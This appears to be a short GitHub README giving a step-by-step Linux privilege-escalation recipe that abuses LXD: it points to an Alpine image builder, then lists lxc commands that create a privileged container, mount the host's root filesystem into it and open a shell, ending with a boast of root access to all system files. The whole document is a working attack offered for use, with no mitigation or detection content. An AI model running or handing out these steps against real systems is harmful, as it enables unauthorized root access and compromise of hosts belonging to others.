# lxd_privilege_escalation
how to make a linux privilege escalation using the {LXD}
!!!!!!(FOLLOW THESE STEPS FROM THIS GITHUB REPO TO MAKE A NEW ALPINE IMAGE)!!!!!!
https://github.com/saghul/lxd-alpine-builder.git


#After making the alpine image
STEP 1 -------->    lxc image import {the new alpine image} --alias {name your image}
STEP 2 -------->    lxc init {use the alias} mycontainer -c security.privileged=true
STEP 3 -------->    lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
STEP 4 -------->    lxc start mycontainer
STEP 5 -------->    lxc exec mycontainer /bin/sh
STEP 6 -------->    cd /mnt/root
BOOOOOOOM now you have a root access to all the system's files from our container inside /mnt/root

#NOTE : {} -----> delete the braces from the commands it's only for demonstration
